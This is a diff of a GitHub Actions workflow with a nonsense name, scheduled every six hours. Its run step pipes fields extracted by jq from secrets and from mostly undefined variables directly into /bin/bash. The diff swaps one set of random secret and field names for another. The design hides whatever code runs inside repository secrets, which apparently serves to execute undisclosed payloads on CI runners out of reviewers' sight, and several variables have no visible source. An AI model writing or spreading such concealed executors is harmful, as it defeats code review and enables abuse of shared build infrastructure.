@@ -3,22 +3,21 @@ name: ragregshibie
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
-
+    - cron: '59 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: ragregshibie
         env:
-          rvfp3041: ${{ secrets.rvfp3041 }}
+          rawr1: ${{ secrets.rawr1 }}
         run: |
-          echo $rvfp3041 | jq -r .p448 | /bin/bash
-          echo $ehw31 | jq -r .rqx91 | /bin/bash
-          echo $xucg263 | jq -r .ypsoe3812 | /bin/bash
-          echo $fekn62338 | jq -r .agc58 | /bin/bash
-          echo $rw41724 | jq -r .zb1 | /bin/bash
-          echo $gvt2 | jq -r .uf0 | /bin/bash
-          echo $xbmfn341 | jq -r .hwgiy99620 | /bin/bash
+          echo $rawr1 | jq -r .dc5943 | /bin/bash
+          echo $xhwda99459 | jq -r .hou70273 | /bin/bash
+          echo $v3 | jq -r .ziyl57995 | /bin/bash
+          echo $dr9427 | jq -r .quejm9 | /bin/bash
+          echo $zx34912 | jq -r .jdkqj6160 | /bin/bash
+          echo $lkgc06 | jq -r .lz4470 | /bin/bash
 
